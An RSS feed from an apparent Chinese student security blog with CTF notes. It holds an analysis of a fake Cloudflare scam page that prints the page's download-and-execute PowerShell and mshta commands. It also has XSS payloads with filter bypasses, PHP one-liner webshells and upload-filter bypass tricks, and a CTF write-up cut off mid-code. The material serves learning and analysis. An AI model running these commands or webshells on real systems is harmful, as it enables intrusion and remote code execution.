@@ -1,0 +1,472 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Hel1um17&apos;s Blog</title><description>No description</description><link>https://fuwari.vercel.app/</link><language>zh_CN</language><item><title>【网络安全】记一次研究假Cloudflare的过程</title><link>https://fuwari.vercel.app/posts/2025-6-14/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/2025-6-14/</guid><pubDate>Sat, 14 Jun 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;前言&lt;/h1&gt;
+&lt;p&gt;从B站上看到有人叫骗了，网站&lt;strong&gt;pump.fun.ong&lt;/strong&gt;，就来凑个热闹&lt;/p&gt;
+&lt;h1&gt;研究&lt;/h1&gt;
+&lt;p&gt;访问网站发现有Cloudflare的防火墙，但是竟然让我Win+R，Ctrl+V，Enter ？&lt;br /&gt;
+这是什么新的社工方式？
+&lt;img src=&quot;./img/2025-6-14/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;powershell.exe -WindowStyle Hidden -Command &quot;$oip=&apos;pump.fun.ong&apos;; $eip=iwr $oip; iex $eip&quot; #  🔸 Cloudflare Unique Code: 49993797784757248066625515
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;问了问ChatGPT，搞了个命令给要执行的命令下载下来了&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Invoke-WebRequest -Uri &quot;http://pump.fun.ong&quot; -OutFile &quot;payload.txt&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;打开payload.txt为&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;powershell -ec &quot;QwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAG0AcwBoAHQAYQAuAGUAeABlACAAIgBoAHQAdABwAHMAOgAvAC8AbABpAG4AawB0AHIAZQBlAC4AbABhAC8AQQBwAHIAaQBsAFIAZQBkAEcAcgBhAHAAZQAuAHQAeAB0ACIA&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;翻译一下，其实是执行&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;C:\Windows\System32\mshta.exe &quot;https://linktree.la/AprilRedGrape.txt&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;又给这个AprilTedGrape.txt下载下来了&lt;br /&gt;
+具体内容感兴趣可以自己下载下来看看，我用沙盒执行了一下，许多内容都没有渲染出来，不知道先前的哥们是咋叫骗得&lt;/p&gt;
+&lt;h1&gt;后记&lt;/h1&gt;
+&lt;p&gt;虽说研究到一半就停止了，但收获了很多知识&lt;br /&gt;
+不过话说真的有人信这个执行命令的Cloudflare吗？&lt;/p&gt;
+</content:encoded></item><item><title>【CTF笔记】RC4加密</title><link>https://fuwari.vercel.app/posts/2025-05-04/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/2025-05-04/</guid><pubDate>Sun, 04 May 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;一、原理&lt;/h1&gt;
+&lt;p&gt;在密码学中，RC4（来自Rivest Cipher 4的缩写）是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。&lt;br /&gt;
+RC4算法的原理很简单，包括初始化算法（KSA）和伪随机子密码生成算法（PRGA）两大部分。&lt;/p&gt;
+&lt;h2&gt;1、初始化算&lt;/h2&gt;
+&lt;p&gt;假设S-box的长度为256，密钥长度为Len，在初始化的过程中，密钥的主要功能是将S-box搅乱。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;void rc4_init(unsigned char*s,unsigned char*key, unsigned long Len)
+{
+    int i=0,j=0;
+    unsigned char tmp=0;
+    for(i=0;i&amp;lt;256;i++) {
+        s[i]=i;
+        k[i]=key[i%Len];
+    }
+    for(i=0;i&amp;lt;256;i++) {
+        j=(j+s[i]+k[i])%256;
+        tmp=s[i];
+        s[i]=s[j];
+        s[j]=tmp;
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;2、加解密&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;void rc4_crypt(unsigned char*s,unsigned char*Data,unsigned long Len)
+{
+    int i=0,j=0,t=0;
+    unsigned long k=0;
+    unsigned char tmp;
+    for(k=0;k&amp;lt;Len;k++)
+    {
+        i=(i+1)%256;
+        j=(j+s[i])%256;
+        tmp=s[i];
+        s[i]=s[j];
+        s[j]=tmp;
+        t=(s[i]+s[j])%256;
+        Data[k]^=s[t];
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;i确保S-box的每个元素都得到处理，j保证S-box的搅乱是随机的。而不同的S-box在经过伪随机子密码生成算法的处理后可以得到不同的子密钥序列，将S-box和明文进行xor运算，得到密文，解密过程也完全相同。&lt;/p&gt;
+&lt;h1&gt;二、代码&lt;/h1&gt;
+&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+
+void rc4_init(unsigned char *s, unsigned char *key, unsigned long Len) {
+    int i = 0, j = 0;
+    unsigned char k[256] = {0};
+    unsigned char tmp = 0;
+
+    for (i = 0; i &amp;lt; 256; i++) {
+        s[i] = i;
+        k[i] = key[i % Len];
+    }
+
+    for (i = 0; i &amp;lt; 256; i++) {
+        j = (j + s[i] + k[i]) % 256;
+        tmp = s[i];
+        s[i] = s[j];
+        s[j] = tmp;
+    }
+}
+
+void rc4_crypt(unsigned char *s, unsigned char *Data, unsigned long Len) {
+    int i = 0, j = 0, t = 0;
+    unsigned long k = 0;
+    unsigned char tmp;
+
+    for (k = 0; k &amp;lt; Len; k++) {
+        i = (i + 1) % 256;
+        j = (j + s[i]) % 256;
+        tmp = s[i];
+        s[i] = s[j];
+        s[j] = tmp;
+        t = (s[i] + s[j]) % 256;
+        Data[k] ^= s[t];
+    }
+}
+
+void print_hex(unsigned char *data, unsigned long len) {
+    for (unsigned long i = 0; i &amp;lt; len; i++) {
+        printf(&quot;%02X &quot;, data[i]);  // 打印为十六进制
+    }
+    printf(&quot;\n&quot;);
+}
+
+int main() {
+    unsigned char s[256] = {0};
+    unsigned char key[] = &quot;This is key&quot;;
+    unsigned char Data[] = &quot;This is plaintext or ciphertext&quot;;
+
+    // 初始化 RC4 状态
+    rc4_init(s, key, strlen((const char*)key));
+
+    // 对数据进行加密或解密
+    rc4_crypt(s, Data, strlen((const char*)Data));
+
+    // 输出加密或解密后的结果
+    printf(&quot;Encrypted/Decrypted data (in hex):\n&quot;);
+    print_hex(Data, strlen((const char*)Data));
+
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+</content:encoded></item><item><title>【CTF笔记】XSS漏洞</title><link>https://fuwari.vercel.app/posts/2025-02-11/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/2025-02-11/</guid><pubDate>Tue, 11 Feb 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;一、XSS漏洞分类&lt;/h1&gt;
+&lt;h2&gt;1、反射型（非持久型）&lt;/h2&gt;
+&lt;p&gt;原理：服务器收到客户端请求时的参数，没有进行过滤，直接将参数用于构造HTML，以HTML的形式返回给浏览器，并在浏览器执行&lt;/p&gt;
+&lt;h2&gt;2、存储型（持久型）&lt;/h2&gt;
+&lt;p&gt;原理：XSS代码存储在服务器中，当受害者访问URL时，XSS代码被嵌入到HTML中，返回给浏览器，并执行&lt;/p&gt;
+&lt;h2&gt;3、DOM型&lt;/h2&gt;
+&lt;p&gt;原理：客户端的JavaScript代码接受数据，没有进行过滤，构造HTML页面的DOM节点时，XSS代码被执行&lt;/p&gt;
+&lt;hr /&gt;
+&lt;p&gt;注意，反射型和DOM型有一下区别：&lt;/p&gt;
+&lt;h3&gt;a、触发流程不同&lt;/h3&gt;
+&lt;h4&gt;反射型&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;流程：&lt;br /&gt;
+用户输入 → 发送到服务器 → 服务器返回含输入的页面 → 浏览器执行恶意代码
+&lt;ul&gt;
+&lt;li&gt;恶意代码直接嵌入在HTTP响应中（如URL参数被服务器返回）。&lt;/li&gt;
+&lt;li&gt;需要用户点击一个构造的恶意链接（如钓鱼链接）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;DOM型&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;流程：&lt;br /&gt;
+用户输入 → 浏览器前端处理（不经过服务器） → 直接修改DOM → 触发漏洞
+&lt;ul&gt;
+&lt;li&gt;恶意代码完全在客户端通过JavaScript动态操作DOM生成。&lt;/li&gt;
+&lt;li&gt;服务器响应中看不到恶意代码（查看网页源码时可能无异常）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;b、数据来源与处理位置&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;特征&lt;/th&gt;
+&lt;th&gt;反射型XSS&lt;/th&gt;
+&lt;th&gt;DOM型XSS&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;数据来源&lt;/td&gt;
+&lt;td&gt;URL参数、POST数据等&lt;/td&gt;
+&lt;td&gt;URL参数&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;数据处理位置&lt;/td&gt;
+&lt;td&gt;服务器端拼接并返回HTML&lt;/td&gt;
+&lt;td&gt;客户端JavaScript操作DOM&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;是否依赖服务器响应&lt;/td&gt;
+&lt;td&gt;是（漏洞在服务端未过滤）&lt;/td&gt;
+&lt;td&gt;否（漏洞在客户端JS逻辑）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h1&gt;二、XSS漏洞利用代码&lt;/h1&gt;
+&lt;h2&gt;1、常见验证代码&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;//弹框，最常用
+&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;
+//弹出确认框
+&amp;lt;script&amp;gt;confirm(&apos;xss&apos;)&amp;lt;/script&amp;gt;
+//弹出输入框
+&amp;lt;script&amp;gt;prompt(&apos;xss&apos;)&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;2、利用代码&lt;/h2&gt;
+&lt;h3&gt;a、构造请求&lt;/h3&gt;
+&lt;p&gt;GET：创建Image对象，其src属性为目标URL&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&apos;example.com&apos;&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;POST：如下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;var xhr = new XMLHttpRequest();
+var url = &quot;https://example.com&quot;;
+//参数，根据需要调整
+var params = &quot;a=a&amp;amp;b=b&quot;;
+xhr.open(&quot;POST&quot;, url, true);
+xhr.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);
+//发送POST请求
+xhr.send(params);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;b、结合BeEF&lt;/h3&gt;
+&lt;p&gt;安装及使用链接：&lt;a href=&quot;https://github.com/beefproject/beef/wiki&quot;&gt;BeEF wiki&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;c、恶意跳转&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;window.location.href=&quot;http://www.baidu.com&quot;;&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1&gt;三、WAF绕过&lt;/h1&gt;
+&lt;h2&gt;1、大小写&lt;/h2&gt;
+&lt;p&gt;当只过滤了 &lt;strong&gt;script&lt;/strong&gt; 时，可以通过变换大小写绕过&lt;/p&gt;
+&lt;h2&gt;2、双写过滤的字符&lt;/h2&gt;
+&lt;p&gt;当只对特定字符替换为空一遍时，可以通过双写绕过&lt;br /&gt;
+如替换 &lt;strong&gt;script&lt;/strong&gt; 为空时，可以写成 &lt;strong&gt;scrscriptipt&lt;/strong&gt; ，过滤为空后为 &lt;strong&gt;script&lt;/strong&gt;&lt;/p&gt;
+&lt;h2&gt;3、写在其他标签中&lt;/h2&gt;
+&lt;p&gt;如：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&quot;xxx&quot; onerror=&quot;alert(&apos;1&apos;)&quot;&amp;gt;
+&amp;lt;audio src=x onerror=alert(1)&amp;gt;
+&amp;lt;audio src=x onerror=prompt(1);&amp;gt;
+&amp;lt;audio src=# href=# onerror=javascript:alert(1)&amp;gt;&amp;lt;/audio&amp;gt;
+&amp;lt;video src=x onerror=prompt(123)&amp;gt;
+&amp;lt;video src=x onerror=alert(123)&amp;gt;
+&amp;lt;button onfocus=alert(1) autofocus&amp;gt;
+&amp;lt;button onclick=alert(1234)&amp;gt;xxx&amp;lt;/button&amp;gt;
+&amp;lt;a onmouseover=&quot;alert(&apos;1&apos;)&quot;&amp;gt;xxx&amp;lt;/a&amp;gt;
+&amp;lt;div onmouseover=&quot;alert(&apos;1&apos;)&quot;&amp;gt;xxx&amp;lt;/div&amp;gt;
+&amp;lt;svg onload=&quot;alert(1)&quot;&amp;gt;
+&amp;lt;details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41))&amp;gt;
+&amp;lt;script&amp;gt;eval(\u0061\u006c\u0065\u0072\u0074(1))&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;4、在其中加入其他特殊字符&lt;/h2&gt;
+&lt;p&gt;如：！ @ # ￥ % …… &amp;amp; * （ ） ! @ # $ % ^ &amp;amp; * ( ) / \ | 等&lt;/p&gt;
+&lt;h2&gt;5、其他&lt;/h2&gt;
+&lt;p&gt;详见：&lt;a href=&quot;https://bbs.kanxue.com/thread-250852.html&quot;&gt;链接&lt;/a&gt;&lt;/p&gt;
+</content:encoded></item><item><title>【CTF笔记】文件上传漏洞</title><link>https://fuwari.vercel.app/posts/2025-02-07/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/2025-02-07/</guid><pubDate>Fri, 07 Feb 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;一、后门代码&lt;/h1&gt;
+&lt;h2&gt;1、一句话后门&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php @eval($_get[&apos;cmd&apos;]); ?&amp;gt;
+&amp;lt;?php @eval($_request[&apos;cmd&apos;]);?&amp;gt;
+&amp;lt;script language=&quot;php&quot;&amp;gt;@eval($_post[&apos;cmd&apos;]);&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;注意，在PHP中配置 &lt;strong&gt;short_open_tag=on&lt;/strong&gt; 时，图片中不能含有 &lt;strong&gt;&amp;lt;?&lt;/strong&gt; ，有会影响PHP代码的解析，导致图片马解析错误&lt;/p&gt;
+&lt;h2&gt;2、其他后门代码&lt;/h2&gt;
+&lt;p&gt;后门代码变形：&lt;a href=&quot;https://zhuanlan.zhihu.com/p/476338641&quot;&gt;WebShell变形&lt;/a&gt;
+哥斯拉WebShell免杀：&lt;a href=&quot;https://github.com/Tas9er/ByPassGodzilla/&quot;&gt;Github链接&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;注： &lt;strong&gt;assert()&lt;/strong&gt; 函数在高版本好像不能直接用，详见：&lt;a href=&quot;https://www.php.net/manual/zh/function.assert.php&quot;&gt;PHP手册&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;二次渲染生成图片马（如upload-labs16关）见：&lt;a href=&quot;https://xz.aliyun.com/news/2337&quot;&gt;二次渲染&lt;/a&gt;&lt;/p&gt;
+&lt;h1&gt;二、WAF绕过&lt;/h1&gt;
+&lt;h2&gt;1、允许的后缀名测试&lt;/h2&gt;
+&lt;p&gt;使用 &lt;strong&gt;BurpSuite&lt;/strong&gt; 中的 &lt;strong&gt;Intruder&lt;/strong&gt; 爆破可行的后缀名，包括大小写等&lt;/p&gt;
+&lt;p&gt;字典见：&lt;a href=&quot;https://github.com/Hel1um17/FuzzDictionary&quot;&gt;字典&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;2、更改数据包内容&lt;/h2&gt;
+&lt;h3&gt;a、Content-Type&lt;/h3&gt;
+&lt;p&gt;更改Content-Type为图片等，常见的见：&lt;a href=&quot;https://developer.mozilla.org/zh-cn/docs/web/http/mime_types/common_types&quot;&gt;MIME类型&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;b、文件头&lt;/h3&gt;
+&lt;p&gt;更改文件头实现绕过，常用的文件头见：&lt;a href=&quot;https://www.cnblogs.com/yuluoxingkong/p/10675521.html&quot;&gt;文件头&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;c、加入特殊字符&lt;/h3&gt;
+&lt;p&gt;如：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;空格
+.
+::$data
+//注意，以下两个的区别为get方式会自动解码，而post不会，所以需要自己编码后再发送
+%00
+0x00
+0x0a
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;注意，可以使用双写某些字符实现对单次过滤的绕过&lt;/p&gt;
+&lt;h3&gt;d、更改保存路径&lt;/h3&gt;
+&lt;p&gt;当可以更改保存名称时，可以更改保存名称为 &lt;strong&gt;WebShell.php/.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;当通过数组截取后缀名来判断时，可以使用&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;save_name[0]=WebShell.php/
+//具体索引由代码审计中来
+save_name[2]=png
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;原理见：&lt;a href=&quot;https://www.cnblogs.com/xingzhuz/p/18628659&quot;&gt;upload-labs21&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;e、其他&lt;/h3&gt;
+&lt;p&gt;其他中的方法来自小迪师傅，因脑洞太大此处不好描述，&lt;/p&gt;
+&lt;p&gt;视频见：&lt;a href=&quot;https://www.bilibili.com/video/BV1JZ4y1c7ro?p=23&quot;&gt;小迪安全&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;在数据包中增加垃圾数据，在数据包大小超过某一限制时，从而直接放行&lt;/p&gt;
+&lt;p&gt;在数据包文件名处更改**filename=&quot;WebShell.php&quot;**的形式为：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;filename=x.php
+filename=&quot;x.php
+filename=&apos;x.php
+filename=&quot;a.jpg;.php&quot;;
+filename=&quot;x.php%00.jpg&quot;
+filename=&quot;Content-Disposition: form-data;name=&quot;upload_file&quot;;x.php
+//先看以哪个为准，之后在为准的那个改为php后缀
+filename=&quot;a.jpg&quot;;filename=&quot;b.jpg&quot;;filename=&quot;c.jpg&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;3、上传某些配置文件&lt;/h2&gt;
+&lt;h3&gt;a、上传Apache下的 .htaccess 文件&lt;/h3&gt;
+&lt;p&gt;上传 &lt;strong&gt;.htaccess&lt;/strong&gt; 实现让PHP解析WebShell.png为php文件等操作&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;.htaccess&lt;/strong&gt; 的内容我就不放了，百度即可（其实我试了半天愣是不行 /_ \ ）&lt;/p&gt;
+&lt;h3&gt;b、.user.ini&lt;/h3&gt;
+&lt;p&gt;上传 &lt;strong&gt;.user.ini&lt;/strong&gt; 文件，其中配置&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;//在前面插入WebShell.png
+auto_prepend_file=WebShell.png
+//在后面插入WebShell.png
+auto_append_file=WebShell.png
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;实现对此目录下的PHP文件，插入到正常PHP文件中并以PHP解析WebShell.png&lt;/p&gt;
+&lt;h2&gt;4、其他方法&lt;/h2&gt;
+&lt;h3&gt;a、条件竞争&lt;/h3&gt;
+&lt;p&gt;适用于先上传再判断合规与否的情况
+一个 &lt;strong&gt;Intruder&lt;/strong&gt; 负责发包，使文件上传，另一个 &lt;strong&gt;Intruder&lt;/strong&gt; 负责访问，负责访问PHP代码，使其执行将WebShell写到目录中&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&amp;lt;?php phpinfo();?&amp;gt;&apos;);?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3&gt;b、常见中间件解析漏洞&lt;/h3&gt;
+&lt;p&gt;Apache换行解析漏洞等，详见：&lt;a href=&quot;http://www.xiaodi8.com/?id=141&quot;&gt;PDF资料&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;c、文件包含漏洞&lt;/h3&gt;
+&lt;p&gt;配合文件包含漏洞，解析图片马&lt;/p&gt;
+</content:encoded></item><item><title>【图片马的踩坑】PHP报错Unexpected character in input的解决</title><link>https://fuwari.vercel.app/posts/2025-02-05/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/2025-02-05/</guid><pubDate>Wed, 05 Feb 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;问题&lt;/h1&gt;
+&lt;p&gt;环境：phpstudy搭建的 &lt;strong&gt;Apache2.4.39&lt;/strong&gt; + &lt;strong&gt;PHP7.3.4&lt;/strong&gt; ，配置文件均为默认&lt;/p&gt;
+&lt;p&gt;在upload-labs练习中，传了一个图片马，但是蚁剑死活连不上，PHP还报错说&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Warning: Unexpected character in input: &apos;&apos; (ASCII=28) state=0 in C:\Users\Hel1um17\Codes\localhost\index.php on line 144
+Parse error: in C:\Users\Hel1um17\Codes\localhost\index.php on line 144
+//为了方便起见，index.php为我的图片马，此时为后来我自己测试
+//实际情况是，用了auto_prepend_file将图片包含在readme.php中，蚁剑连接readme.php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1&gt;解决&lt;/h1&gt;
+&lt;p&gt;对比报错的每一行发现发现，每行都含有若干个 &lt;strong&gt;&amp;lt;?&lt;/strong&gt;
+将其删去后蚁剑可以正常连接&lt;/p&gt;
+&lt;h1&gt;疑问&lt;/h1&gt;
+&lt;p&gt;但平时看师傅们的视频也没有说特意将 &lt;strong&gt;&amp;lt;?&lt;/strong&gt; 去掉&lt;/p&gt;
+&lt;p&gt;只是直接在文件末尾加上了后门代码，也可以连接成功&lt;/p&gt;
+&lt;p&gt;有没有懂的师傅可以解答一下？（已解决）&lt;/p&gt;
+&lt;h1&gt;后记&lt;/h1&gt;
+&lt;p&gt;我后来去Stack Overflow问了&lt;a href=&quot;https://stackoverflow.com/questions/79411834/i-cant-connect-my-webshell-in-file-upload-vulnerability&quot;&gt;这个问题&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;C3roe 大佬说在 &lt;strong&gt;php.ini&lt;/strong&gt; 中设置了 &lt;strong&gt;short_open_tag=On&lt;/strong&gt; 时会把 &lt;strong&gt;&amp;lt;?&lt;/strong&gt; 当成PHP代码的开头从而开始解析。我将 &lt;strong&gt;short_open_tag&lt;/strong&gt; 设置为了 &lt;strong&gt;OFF&lt;/strong&gt; 就没有报错了&lt;/p&gt;
+&lt;p&gt;不过我那英语可能没表述清楚，让几个人投了不适合回答，我就把问题删了＞﹏＜，不过还是感谢歪果仁&lt;/p&gt;
+</content:encoded></item><item><title>【CTF比赛】2024青少年强网杯WP</title><link>https://fuwari.vercel.app/posts/2024-11-24/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/2024-11-24/</guid><description>记参加的第一场CTF比赛，虽说没有进线下，不过我觉得这的确是一个难忘的回忆</description><pubDate>Sun, 24 Nov 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;一、战队信息&lt;/h1&gt;
+&lt;p&gt;战队名称：就来看看题
+战队排名：87&lt;/p&gt;
+&lt;h1&gt;二、解题情况&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&quot;./img/2024-11-24/1.png&quot; alt=&quot;解题情况&quot; /&gt;&lt;/p&gt;
+&lt;h1&gt;三、解题过程&lt;/h1&gt;
+&lt;h2&gt;1、签到漫画&lt;/h2&gt;
+&lt;p&gt;操作内容：
+四个漫画每个翻到最后一页，每页有四分之一的二维码，用ppt（不会用其他软件·＞﹏＜）把图拼一下，使用在线扫描，url后面即为flag&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/2024-11-24/2.png&quot; alt=&quot;拼接好的二维码&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;扫描结果：
+http://weixin.qq.com/r/4BIrMz7ES2M0rXpQ90fy?flag{youthful_and_upward}&lt;/p&gt;
+&lt;p&gt;flag值：
+flag{youthful_and_upward}&lt;/p&gt;
+&lt;h2&gt;2、whitepic&lt;/h2&gt;
+&lt;p&gt;操作内容：
+使用010editor发现是个gif文件，扔到https://ezgif.com/maker（这网站还是在文件里的create by找到的）里发现第二张就是flag&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/2024-11-24/3.png&quot; alt=&quot;图片&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;flag值：
+flag{passion_is_the_greatest_teacher}&lt;/p&gt;
+&lt;h2&gt;4、问卷&lt;/h2&gt;
+&lt;p&gt;操作内容：
+填写完调查问卷即可https://www.wenjuan.com/s/UZBZJvmmIG/&lt;/p&gt;
+&lt;p&gt;flag值：
+flag{thank_you_for_your_support}&lt;/p&gt;
+&lt;h2&gt;5、Classics&lt;/h2&gt;
+&lt;p&gt;操作内容：
+下载后发现是CyberChef的样子，使用CyberChef照着那几个编码弄上去，但是改成decode
+发现不对，改了改rot13的amount，解出来了
+（本来上午用ciphey就跑出来了，结果上午跑出来了，下午死活卡死，顶不住啊，用CyberChef再弄了一遍＞﹏＜ )&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/2024-11-24/4.png&quot; alt=&quot;CyberChef&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;flag值：
+flag{2834d185-a1da-4fb1-8bac-59076eb6a634}&lt;/p&gt;
+&lt;h2&gt;6、AliceAES&lt;/h2&gt;
+&lt;p&gt;题目翻译：
+AES 加密示例
+你是 Alice，你和 Bob共享相同的key和iv值。
+你的任务是向鲍勃发送一条消息：你好，鲍勃！
+使用CBC模式的 AES 加密消息，并以HEX格式与 Bob 共享加密结果。&lt;/p&gt;
+&lt;p&gt;操作内容：
+直接用key和vi值，找一个aes加密的网站，加密即可&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;img/2024-11-24/5.png&quot; alt=&quot;AES&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;flag值：
+flag{41865c5e-f20f-44b1-85a4-844a4578ead0}&lt;/p&gt;
+&lt;h2&gt;7、easymath&lt;/h2&gt;
+&lt;p&gt;操作内容：
+先枚举一下前几个，发现有规律&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from Crypto.Util.number import *
+from gmpy2 import next_prime
+for l in range(1,100):
+    key=0
+    for k in range(2**(l-1),2**l):
+        s=bin(k)[2:]
+        if(k%2==1 and &apos;1111&apos; not in s and &apos;0000&apos; not in s):
+            key+=1
+print(f&quot;当l为{l}时，key为{key}&quot;)
+#输出
+#当l为1时，key为1
+#当l为2时，key为1   
+#当l为3时，key为2   
+#当l为4时，key为3   
+#当l为5时，key为7   
+#当l为6时，key为12  
+#当l为7时，key为22  
+#当l为8时，key为40  
+#当l为9时，key为75  
+#当l为10时，key为137
+#当l为11时，key为252
+#当l为12时，key为463
+#当l为13时，key为853
+#当l为14时，key为1568
+#当l为15时，key为2884
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;会发现，从第四个开始，四组一循环，第一个为前三个之和减一，第二个为前三项之和加一，第三四项都是前三项之和
+所以，算一下第l=2331时的key值即可&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;from Crypto.Util.number import *
+from gmpy2 import next_prime
+def calculate_key(l):
+    # 初始的前三个key
+    keys = [1, 1, 2]  
+    for i in range(4, l + 1):
+        if i % 4 == 0:  # 第一组，key = 前3个key之和 - 1
+            new_key = sum(keys[-3:]) - 1
+        elif (i - 1) % 4 == 0:  # 第二组，key = 前3个key之和 + 1
+            new_key = sum(keys[-3:]) + 1
+        else:  # 第三组和第四组，key = 前3个key之和
+            new_key = sum(keys[-3:])
+        keys.append(new_key)
+    return keys[-1]  # 返回第l个key
+l = 2331
+key_at_l = calculate_key(l)
+print(f&quot;l={l}时的key是: {key_at_l}&quot;)
+n=739243847275389709472067387827484120222494013590074140985399787562594529286597003777105115865446795908819036678700460141950875653695331369163361757157565377531721748744087900881582744902312177979298217791686598853486325684322963787498115587802274229739619528838187967527241366076438154697056550549800691528794136318856475884632511630403822825738299776018390079577728412776535367041632122565639036104271672497418509514781304810585503673226324238396489752427801699815592314894581630994590796084123504542794857800330419850716997654738103615725794629029775421170515512063019994761051891597378859698320651083189969905297963140966329378723373071590797203169830069428503544761584694131795243115146000564792100471259594488081571644541077283644666700962953460073953965250264401973080467760912924607461783312953419038084626809675807995463244073984979942740289741147504741715039830341488696960977502423702097709564068478477284161645957293908613935974036643029971491102157321238525596348807395784120585247899369773609341654908807803007460425271832839341595078200327677265778582728994058920387721181708105894076110057858324994417035004076234418186156340413169154344814582980205732305163274822509982340820301144418789572738830713925750250925049059
+key=key_at_l
+p=next_prime(key)
+print(&quot;---&quot;)
+print(p)
+print(&quot;---&quot;)
+# 直接使用&quot;/&quot;会报错，所以用&quot;//&quot;，再算一下p*q是否等于n
+q=n//p
